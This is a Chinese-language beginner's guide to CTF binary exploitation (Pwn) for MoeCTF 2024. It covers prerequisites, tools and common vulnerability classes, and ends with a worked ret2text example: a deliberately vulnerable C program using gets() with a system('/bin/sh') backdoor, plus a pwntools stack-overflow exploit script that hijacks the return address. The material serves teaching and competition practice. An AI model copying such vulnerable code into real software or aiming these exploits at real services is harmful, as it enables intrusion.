# MoeCTF 2024 - Pwn 入门指北

## 欢迎

欢迎来到 MoeCTF 2024 Pwn。🥳

Pwn（读作“砰”，拟声词）一词起源于网络游戏社区，原本表示成功入侵了计算机系统，在 CTF 中则是一种题目方向：通过构造恶意输入达到泄漏信息甚至**劫持几乎整个系统（getshell）**的目的。其实在  CTF 比赛发展初期，赛题通常只与二进制安全相关，因此 Pwn 是 CTF 领域最原始的方向。在这里，你能深入计算机系统最底层，感受纯粹的计算机科学。🤤
$$
Pwn = 逆向工程 + 漏洞挖掘 + 漏洞利用
$$
很高兴能和你一起学习。在这篇文档中，我将尽量简明地介绍 Pwn 是什么、怎么学，希望能有所帮助。本人水平有限，如有纰漏望指正。👀

## 前置知识

Pwn 前置知识很多，也许是 CTF 所有方向中最多的。从零到能自主解出题目需要很长时间，请多点耐心……

### 计算机数据表示

Pwn 属于*二进制*（binary）安全，为什么说是“二进制”？因为计算机只处理和存储二进制信息。与我们日常使用的十进制“逢十进一”不同，“逢二进一”的二进制世界只有“0”和“1”。一位二进制信息称为比特（bit），8 比特为 1 字节（byte），字节通常是计算机处理信息的最小单位，计算机中的信息通常是连续的字节。人类输入给计算机的任何信息（[文字](https://www.bing.com/search?q=ASCII)、[图像](https://www.bing.com/search?q=%E6%95%B0%E5%AD%97%E5%9B%BE%E5%83%8F)、[音频](https://www.bing.com/search?q=%E6%95%B0%E5%AD%97%E9%9F%B3%E9%A2%91)等）都可*编码*为数字信息（二进制比特流）进行处理，需要输出时再*解码*为原形式。

不同进制间可相互转换，你需要<u>熟悉进制转换方式</u>，其中最重要的是**二进制、十进制、十六进制**间的转换。对于 Pwn，我们通常希望轻松阅读内存中的原始数据。为简化二进制表达便于人类理解，我们通常将计算机中二进制数据用十六进制表示：一位十六进制数正好为 4 比特，**两位十六进制数为 1 字节**。

有时为方便数据类型转换和运算，计算机存储数字时，数字在内存中的高低位与人类阅读的高低位相反，这种数据存储方式叫“小端存储”。你需要<u>知道大端序（big-endian）和**小端序**（little-endian）的概念</u>，能够区分它们，并能做到相互转换。

### 程序设计

既然 Pwn 涉及逆向程序逻辑，我们需要看懂程序究竟在做什么并寻找其漏洞，那么我们首先得有能力“正向”写出一般的程序吧。电脑无法读懂人类语言，我们必须得用程序设计语言编写程序，并编译（详见下文“编译与汇编”）成电脑能“读懂”并执行的机器码。正在阅读这篇文档的你很可能没有任何编程基础，这很正常。你也许曾了解过 Visual Basic、JavaScript... 但是对于 Pwn 学习初期，我们一般面对 **Linux 环境下的 C 语言**。

> [!Note]
>
> 在正式开始前，我不得不插入这段。你是否常用 PC，还是只用过手机平板等移动设备？如果你是连从浏览器安装软件、解压缩等基本操作都不熟悉的“电脑小白”，我建议先暂停，利用[互联网资源](https://rainchan.win/SurfingTutorial/)熟悉计算机操作。（接下来我默认你已配置好“科学上网”工具。）
>
> **最重要的是<u>善用搜索引擎</u>**，推荐使用[微软必应](https://www.bing.com/)或[谷歌](https://www.google.com/)。

#### C

鉴于 C 语言贴近底层且灵活度高，大多数 Pwn 题目程序都由 C 语言编写，大多数逆向工具的逆向结果也是类似 C 语言的伪代码（详见下文“IDA 和 gdb”）。你需要入门学习 C 语言，这里推荐阅读《C Primer Plus》，和查阅非教程工具网站 [C 参考手册](https://zh.cppreference.com/w/c)（中文）、[man7.org](https://man7.org/)（英文）。强烈建议在 Linux 环境中编译运行 C 语言（详见下文“环境搭建”）。

我们目前不需要完整系统地学习 C 语言（不代表未来不需要）。你需要关注 C 语言中的<u>基础数据类型、流程控制、标准库函数（`scanf`、`printf`、`puts`、`strcmp`、`system`、`mmap` 等）、位操作和**指针**</u>。**不要**深陷语言特性和算法中。

C 语言能很好地和汇编语言（详见下文“编译与汇编”）对应，学习两者时应相互结合，<u>理解等效的 C 语句和汇编指令</u>。

#### Python

为了能编写漏洞利用脚本（详见下文“Pwntools”），你还需要学习 Python 语言。Python 语言极容易上手，[网上教程](https://www.runoob.com/python3/python3-tutorial.html)多如牛毛。你至少需要<u>学会基本语法与数据类型、列表（`list`）字典（`dict`）数据结构用法、函数（方法）定义及调用</u>。建议使用 Visual Studio Code 编辑器编写 Python 脚本。（少读书多实践）

> [!TIP]
>
> 如果你对计算机科学很感兴趣想系统学习并且英语不错，我强烈建议你看 [CS61A 系列课程](https://cs61a.org/)及其[配套电子书](https://www.composingprograms.com/)学习 Python。


### 环境搭建

#### [GNU](gnu.org)/Linux

Linux 是一种自由和开放源代码的类 Unix 操作系统，如今通常用于服务器，我们日常使用的 PC 操作系统通常是 Windows。由于 MoeCTF 以及其他 CTF 比赛中的 Pwn 题目全都在 Linux 特别是 Ubuntu（一个 Linux 发行版）环境中，为了至少能运行 Pwn 题附件的程序（详见下文“做题”），我们当然需要一个 Linux 环境。推荐<u>安装一个 Ubuntu 虚拟机</u>或使用 docker（详见下文“Pwn”），网上教程太多，这里不赘述（善用搜索引擎）。如果你只是想尝试 Pwn，那么 [WSL2](https://learn.microsoft.com/zh-cn/windows/wsl/install) 也已经够用了，并且更流畅。

#### Pwn

安装好 Linux 环境后，还需继续搭建 Pwn 环境，这里有一篇十分详尽的文章，不过内容比较硬核。😰

- [CTF Wiki - Pwn Environment](https://ctf-wiki.org/pwn/linux/user-mode/environment/#ctf-pwn)（中文）

如果无法完全看懂也没关系，其中有很多在 Pwn 学习后期才会用到的东西。目前你<u>至少需要这三样</u>：

- Linux Python 环境 + pwntools
- 静态逆向分析工具（如 IDA Free）
- Linux 调试器（如 GDB + `pwndbg`）

你还需要安装更多工具：`checksec`、`binutils`、`patchelf`、`LibcSearcher`、`glibc-all-in-one`、`ropper`、`one_gadget`、`seccomp-tools` 等，其中有很多你目前用不到，但<u>前两个建议先安装好</u>（见上文 Wiki 文章）。

**一个标准的 Pwn 流程是：**

1. 用 `checksec` 检查保护机制（详见下文“Linux 安全机制”）
2. 用 `patchelf` 替换 libc、ld 等（可选）
3. 用 IDA 反汇编反编译挖掘漏洞
4. 用 GDB + pwndbg 调试执行确认漏洞
5. 用 Python + pwntools 编写利用脚本

> [!NOTE]
>
> libc 和 ld 分别是 Linux C 标准库和动态链接器。我们用 C 语言编写程序时经常调用一些“从天而降”的函数（`printf`、`scanf`...），它们其实就在 libc（通常为 GNU 提供的 [glibc](https://elixir.bootlin.com/glibc/glibc-2.40.9000/source)）里，ld 则搭起你的程序和这些函数间的“桥梁”。（详见下文“编译与汇编”）Linux 系统中几乎所有软件都需要用到它们！

### Linux 操作

既然 Pwn 一般在 Linux 中操作，那么学习一些 Linux shell 操作自然必要。你至少应该<u>明白 `cd`、`ls` 、`chmod`、`file`、`cat`、`grep`、`strings`、`man` 等基础命令和管道与重定向的概念</u>。在这期间，你也将学到 Linux 用户与用户组及其<u>权限管理</u>机制。推荐这个短文（选读）：

- [命令行的艺术](https://github.com/jlevy/the-art-of-command-line/blob/master/README-zh.md)

> [!NOTE]
>
> 在计算机领域，“shell”是一种计算机程序，它将操作系统的服务提供给人类用户或其他程序，在 Linux 中通常指命令行界面。

对于 Pwn，一个很重要且必要的命令行工具是 Netcat（`nc` 命令），它能用来连接 Pwn 题目在线环境。Netcat 是一个强大的多功能网络工具，目前你只需要<u>知道一种用法：`nc <ip> [端口]`</u>。

> [!NOTE]
>
> 各种命令行文档里的尖括号“<参数名>”代表必需参数，方括号“[参数 名]”代表可选参数，实际使用时不输入。在某些版本的 Netcat 中上述语法应为 `nc <ip>[:端口]`。

另外你应该学习版本控制软件 git 的基本使用方法，主要是 `git clone <URL>`。用于下载各种工具。

还需要<u>了解 Linux 常见的系统调用（syscall）——`open`、`read`、`write`、`mmap`、`execve` 等和文件描述符（file descriptor / fd）的概念：`stdin` - 0、`stdout` - 1 ...</u>。它们是用户空间程序（我们平时运行的程序）和操作系统内核沟通的桥梁。你需要知道 Linux 程序运行时发生了什么（如<u>动态链接过程，`got`、`plt` 的概念，**调用栈结构**</u>）。

很乱对吧？若想系统地详细了解，推荐这些书：

- [《鸟哥的 Linux 私房菜》](https://linux.vbird.org/linux_basic/centos7/)（文中 CentOS7 已停止支持，勿安装）
- 《Unix 环境高级编程》

Linux 一切皆文件！希望你能从中感受到 Unix 哲学的魅力。😃 之后我强烈建议你在空闲时间看看这系列视频：

- [计算机教育中缺失的一课](https://www.bilibili.com/video/BV1rU4y1h7Qr/)（镜像）

### 编译与汇编

当你读到这里时，你或许已经能用 C 语言编写并运行简单程序（最好在 Linux 中操作），然而对于 Pwn 来说，我们必须要熟悉程序编译过程和基本的汇编语句。你需要<u>知道 ELF 文件格式（仅了解）、预处理 -> 编译 -> 汇编 -> 链接（静态 / 动态）过程、Linux 进程虚拟内存空间（**栈**、BSS 段、数据段、代码段等）</u>。<u>理解**调用栈结构**及其增长方向与数据存储增长方向**相反**</u>是 Pwn 前期学习的一大重点。

对于汇编语句，我们平时使用的和 Pwn 程序一般编译至 x86 CPU 指令集（本文默认 64 位 x86），你需要<u>学习 x86 汇编基础，至少应能看懂 `mov`、`lea`、`add`、`sub`、`xor`、`call`、`ret`、`cmp`、`jmp` 及其变种、`push`、`pop`、`nop`</u>。电脑会顺序依次执行这些语句。除了汇编语句，你需要<u>了解 CPU 寄存器</u>，能够区分普通的通用寄存器以及有特殊用途的寄存器（`sp`、`ip`...）。

在做 Pwn 题时，有时你需要先在适当位置填入 shellcode（用于获取 shell 的汇编码）再劫持控制流（详见下文）至此处以执行。你需要知道计算机在汇编层面是如何调用函数的。具体而言，你需要<u>知道并牢记 amd64 System V ABI **函数调用规约**</u>：调用函数时的部分参数通过寄存器（`rdi`、`rsi`、`rdx`、`rcx`、`r8`、`r9`）传递其余通过栈传递，32 位系统直接通过栈传递参数（从右至左入栈）；函数返回值也由寄存器（`rax`）传递。除了函数调用，你还需要<u>知道 syscall 的系统调用号与参数的传递方式</u>（`rax`...），这与函数调用类似。（善用搜索引擎）

## 学习路线

终于正式开始 Pwn 了。😇 <u>以上前置知识没有完全学完很正常，最好边学边做。</u>学习 Pwn 一定不能一直读书，这并不能让你“基础扎实”，网络安全是十分重**实践**的领域。我的经验是多做题，多看其他师傅（通称）的 Writeup（赛后复盘）。另外，尽量看在线资源，书籍信息一般具有滞后性。

### IDA 和 gdb

大多数 Pwn 题的附件都只会提供本题在线服务（由 nc 转发）的可执行文件。我们至少要先用 `objdump` 等命令将其内容解释为人类可读信息。更好的办法是使用专业的逆向分析软件，例如开源软件 Radare2 或者商业软件 IDA（推荐）。对于 Linux 我们还必备 GNU 调试器 `gdb`，它能追踪程序运行的诸多细节。Pwn 的逆向相对简单，一般来说只要将可执行文件拖入 IDA，直接以默认配置加载，按下 F5 即可轻松阅读程序逻辑。学习这些工具时重点关注<u>快捷键</u>，这不是为了做题更快，而是为了不因操作工具扰乱思绪。对于 GDB，你至少应该<u>知道如何运行、暂停、继续程序（`r`、`ctrl+C`、`c`），下断点（`b`）、观察点（`wa`），查看寄存器、反汇编码、栈、映射表信息，读取对应地址内容（`p`、`x`、`tele`）</u>。GDB 的插件 `pwndbg` 提供了更多实用命令（`vmmap`、`stack`、`search`、`canary` ...）。请一边做题一边领悟它们的作用。

### Pwntools

还记得之前好不容易配置好的 pwntools 吗？它能够替我们自动与程序交互：接收程序输出并向程序输入，和手动键盘操作的效果差不多（更快！）。Pwntools 中还有很多实用工具，不仅仅是一个“输入输出工具”。学习 pwntools 不需要从头读文档，应该用到什么学什么。多读其他师傅的 exp（漏洞利用脚本）可以发现很多方便的 pwntools 用法。你至少需要<u>知道如何接收程序输出，如何向程序输入</u>，特别是无法用键盘正常输入的“二进制”信息。当你做了一些 pwn 题后，甚至应该写一个属于自己的 pwntools 模板。

> [!TIP]
>
> 虽然 `recv()` 和 `send()` 很方便，但是我强烈建议使用 `recvuntil()` 和 `sendafter()`，以防止各种本地和远程环境不符的情况。`sendafter` 函数的首个参数（“接收至”）也不宜过长，几个字符即可（别忘了 `\n`）。 Pwntools 库函数的参数和返回值类型通常为 `bytes`，传入字符串字面量时应在前加上 `b` 标记（例如 `b'I am string'` ），使其成为 `bytes`（不这么做会有警告，虽然不影响解题）。

### 常见漏洞和利用方法

以下列举出一些入门常见的漏洞和利用方法，限于篇幅只能一句话概括且不够准确严谨。你<u>必须通过 CTF Wiki 等资料（详见下文“推荐资料”）具体学习</u>，这里仅提供学习方向。（“⭐”数代表针对入门学习的重要性）

#### 普适漏洞

- **整数溢出** —— 数学世界整数有无穷多，但由于内存限制，计算机中补码表示的“整数”有上下限。通过输入超大数字溢出或者利用有符号整数（负数）强转为无符号整数可以构造超大数字，从而绕过检查或越界写入。⭐⭐⭐
- **栈溢出** —— 最经典的漏洞，通过越界写入修改函数返回地址或栈指针从而实现劫持控制流和栈迁移（篡改栈基址 `rbp`）。⭐⭐⭐⭐
- **字符串 \0 结尾** —— C 风格字符串以零字节（“二进制”的 \0 而非 ASCII 数字 0）结尾。如果破坏或中途输入这一标记则可泄漏信息或绕过检查（如绕过 `strcmp`）。这是很多漏洞的“万恶之源”。⭐⭐⭐
- **返回导向编程（ROP）**—— 这是 Pwn 前期学习**重点**。其中包含 ret2text、ret2libc、ret2syscall、ret2system、ret2shellcode、ret2csu、SROP 等，这也是栈溢出的主要目的。进阶：通过 `ropper` 等工具寻找程序中 gadgets（ROP 片段，以 `ret` 结尾）结合栈溢出构造调用链甚至能执行几乎任意行为（通常 `open`、`read`、`write`）。⭐⭐⭐⭐⭐
- **竞争条件** —— 程序并行访问共享资源时，由于各线/进程执行顺序不定，有可能绕过检查或破坏数据。⭐

#### Linux 安全机制

- **NX（No eXecute）**—— 通过将栈内存权限设置为不可执行，使栈上机器码不可执行，从而无法简单地在栈上布置 shellcode。一般所有题目都会开启，可用栈迁移或修改可执行位等方法绕过。⭐⭐⭐
- **Canary** —— 在栈上栈指针和返回地址前设置一个随机值（`canary`），通过比对函数返回前和执行前该值是否相等来检测栈溢出攻击。通过直接越界读泄漏、劫持  `scanf` 特殊输入或爆破等方法绕过。⭐⭐⭐⭐
- **ASLR / PIE** —— 通过随机化程序的内存布局（地址），使得攻击者难以预测程序的内存结构，从而增加攻击难度。设法泄漏基址或爆破等从而绕过。⭐⭐
- **RELRO** —— 通过将动态链接程序的全局偏移量表（GOT）在程序启动后设置为只读，防止通过修改其中数据结构进行攻击。⭐
- **Seccomp** —— 一种沙箱保护机制，可以限制程序能够使用的 syscall。⭐

#### GLibc 相关漏洞

- **fmt_str** —— 若 `printf` 等格式化字符串函数中“格式”（format）参数为用户输入，则可被利用，从而达到任意地址读写等目的。⭐⭐⭐
- **one_gadget** —— 将程序指针修改至 glibc 中的一些特殊位置（`one_gadgets`）同时满足少量条件即可直接 getshell。⭐
- Heap / _IO_FILE / ... —— Pwn 永无止境 ...

### 推荐资料

- ⭐**《深入理解计算机系统》—— CSAPP。个人认为是不得不看的经典。**⭐
- [CTF Wiki](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/)
- [CTF-All-In-One](https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.2_integer_overflow.html)
- 《CTF 权威指南（Pwn 篇）》
- [CS 自学指南](https://csdiy.wiki/)——计算机科学（Computer Science）自学指南。
- 《IDA Pro 权威指南》

## 解题

别忘了这里是 CTF！一般的 CTF Pwn 题目由题目描述、附件、远程环境组成。你需要做的是通过刚才所学分析附件中程序的漏洞并成功在本地 getshell 或拿到“flag”。获取本地的 shell 没什么意义，远程环境运行的程序和附件中的相同，只要连接远程环境并执行相同操作即可获取远程的 shell！（MoeCTF Pwn 比较简单，不一定需要 getshell，有时连附件也没有。）程序附件一般没有可执行权限，记得先执行 `chmod +x <file>`。

> [!IMPORTANT]
>
> 对于西电 CTF 终端：如果你正在使用虚拟机/WSL，最稳妥的方案是在虚拟机/WSL 上安装并配置 wsrx。如果在主机配置 wsrx：请首先确保虚拟机能和主机共享网络（例如能访问正常网站）。在 wsrx 主页点击小齿轮设置监听地址为 0.0.0.0 然后在主机执行 ipconfig 查询本机局域网 IP 地址（或者为虚拟机配置的 NAT 分配的主机地址），在虚拟机/WSL 里通过主机地址（例如 192.168.*.*）连接远程环境而非 127.0.0.1/localhost。注意在这种情况下需要将平台在线环境给出的 ws 链接（点击“WSRX”键）粘贴到 wsrx 主页进行连接而不能用平台直接创建连接。连接环境并非题目考察内容，如仍有问题请直接联系群管理员。

MoeCTF 题目设置由易到难知识覆盖面较广，而且面向基础。但是但是，刚开始做 Pwn 也许一道题就能做一天（也算是 Pwn 的乐趣所在吧😌），这很正常。如果你未能完全看懂本指北，也很正常（“学习路线”一节有不少“超纲”）。大胆尝试才是关键！直接开始 MoeCTF 2024 吧，如果你未来想要继续做题：

- [攻防世界](https://adworld.xctf.org.cn/)
- [Bugku](https://ctf.bugku.com/)
- [pwn.college](https://pwn.college/)（零基础）
- Pwnable
- [CTFTime](https://ctftime.org/)——全球 CTF 赛事时间表。

## 实例

接下来是一个简单的 `ret2text` 实例。

### 题目

环境：x86_64 GNU/Linux

```c
// File: pwn.c

#include <stdio.h>
#include <stdlib.h>

void backdoor() { system("/bin/sh"); }

int main(void) {
  char name[0x10];
  puts("What's your name?");
  gets(name);
  printf("Hello, %s!\n", name);
  return 0;
}
```

通过以下命令进行编译（`$` 仅为提示符，实际不输入），强制启用 `char *gets(char *)` 并关闭一些保护机制。

```sh
$ gcc --ansi -no-pie -fno-stack-protector pwn.c -o pwn
```

接下来，我们假设这个程序文件在网上公开下载，假设这个程序在一台服务器上运行，已经暴露在网络中，提供给远程计算机进行交互。现在我们来攻击它。😈

### 攻击

#### 1. 用 `checksec` 检查保护机制

我们是攻击者，已经得到了这个程序文件（就是刚才编译的结果）。在程序所在目录执行

```sh
$ checksec --file=pwn
```

，输出（部分略）：

```
RELRO           STACK CANARY      NX            PIE
Partial RELRO   No canary found   NX enabled    No PIE
```

。可以看到栈溢出保护（Stack Canary）和位置无关程序（PIE）保护已关闭。

#### 2. 用 IDA 反汇编反编译挖掘漏洞

将程序拖入 IDA 中加载（你可能需要将程序文件从虚拟机中移到主机中，这里不赘述），找到 `main` 函数，按 F5 反编译显然可得该程序使用一个不会检查输入与缓冲区长度的 `gets` 函数读入字符串，我们因此可以进行无限长**栈溢出**。同时我们看到 `backdoor` 函数会启用一个 shell，这正是我们想要的。由于没有启用 PIE，于是只需将控制流劫持到此处（静态地址）即可。记下 `backdoor` 函数地址。

主函数结束方式为正常 `return`，此时程序执行流会跳转到先前调用主函数时保存在栈中的返回地址所指向的位置。但是由于栈向低地址扩展（反向），而字符串写入由低地址向高地址（正向），且程序执行时先保存返回地址再开辟用于存储栈上字符串的空间，所以返回地址位于读入字符串的高地址处且可因字符串溢出而被修改。`gets()` 在读入字符串时不会检查长度，可以任意长度溢出。因此只需覆盖返回地址至 `backdoor` 即可。别忘了调用栈上返回地址前还保存了栈指针，虽然对解题无影响，但因此需要多输入覆盖 8 个字节。由于编译器会倾向将栈上变量地址 16 字节对齐（地址能被 16 整除），所以栈上最高地址（最后一个）变量的末尾可能不紧贴暂存的 `rbp`。不能通过变量的“大小”直接判定其与栈底的偏移，做题时可以通过反编译结果中变量旁的注释查看栈上变量的准确位置。

#### 3. 用 GDB + pwndbg 调试执行确认漏洞

在程序所在目录执行（`pwndbg>` 仅为提示符，实际不输入）

```sh
$ gdb ./pwn
pwndbg> b gets
pwndbg> r
```

，触发断点。观察 `[ STACK ]` 一栏，可以看到当前的程序调用栈（注意 GDB 中地址空间随机化默认不启用，但对于本题无影响）：

```
00:0000│ rsp     0x7fffffffd4a8 —▸ 0x40118f (main+35) ◂— lea rax, [rbp - 10h]
01:0008│ rax rdi 0x7fffffffd4b0 ◂— 0x0
02:0010│-008     0x7fffffffd4b8 —▸ 0x7fffffffd5e8 —▸ 0x7fffffffda83
03:0018│ rbp     0x7fffffffd4c0 —▸ 0x7fffffffd560 —▸ 0x7fffffffd5c0 ◂— 0x0
04:0020│+008     0x7fffffffd4c8 —▸ 0x7ffff7da7e08 (__libc_start_call_main+120) ◂— mov edi, eax
...
```

​	（其中 `—▸` 和 `◂—` 都可理解为 C 语言中的指针解引用，`0x7fxxxx` 为栈地址，未实际存储。）

- rsp + 0x00：当前栈顶。存放 `gets` 函数的返回地址。（不重要，无法控制）
- rsp + 0x08：存放 `name` 前半。第 1 个参数（`rdi` 所指），即源码中 `name`。用户输入自此读入。
- rsp + 0x10：存放 `name` 后半。此时仍有“垃圾”数据。
- rsp + 0x18：存放 `__libc_start_call_main` 函数（`main` 的调用方）的调用栈帧基址（`rbp`）。
- rsp + 0x20：存放 `main` 函数**返回地址**。

#### 4. 用 Python + pwntools 编写利用脚本

在程序所在目录编写 Python 脚本

```python
# File: pwnit.py

from pwn import *                 # pwntools
io = process('./pwn')             # 启动程序
backdoor_address = ...            # 刚才获得的 `backdoor` 地址
backdoor_address += 1             # 施法
payload  = cyclic(0x10)           # 填满 `name`
payload += cyclic(0x8)            # 填满暂存的 `rbp`
payload += p64(backdoor_address)  # 篡改返回地址
io.sendlineafter(b'?\n', payload) # 待输出至 `?\n` 后输入 payload
io.interactive()                  # 收获成果
```

。在程序所在目录执行

```sh
$ python pwnit.py
```

，成功 getshell。🎉

实际上你需要用 `io = connect('<IP>', <端口>)` 替换 `io = process('./pwn')` 以攻击远程环境（相当于 `nc` 连接）。

> [!NOTE]
>
> ##### `backdoor_address += 1` 是个啥？
>
> 你可以试着去掉这行再运行看看，程序运行时触发 SIGSEGV（段错误）。这是 Pwn 初学者必踩一次的坑。用 GDB 调试运行（pwntools `gdb` 模块能帮到你），程序在 `system` 函数中这个指令处崩溃：
>
> ```assembly
> movaps xmmword ptr [rsp + 0x50], xmm0
> ```
>
> 其实是 `movaps` 指令要求目标地址（此处为 `rsp + 0x50`）16 字节对齐（尾数为 0）导致的。通过将劫持的地址 +1，跳过 `backdoor` 中的 `push rbp`（该指令机器码长度 1 字节）从而使 `rsp` 16 字节对齐。
>
> 类似的解决方案是在 ROP 调用链中插入一个空 gadget（仅 `ret`），使 `rsp` 16 字节对齐。

## 感谢

感谢你认真读到这里，感谢所有让 MoeCTF 2024 成为可能的人。😉



作者：RiK，本文以 [CC BY-SA 4.0](https://creativecommons.org/licenses/by-sa/4.0/deed.zh-hans) 协议共享。（参考资料均已在文中引用）
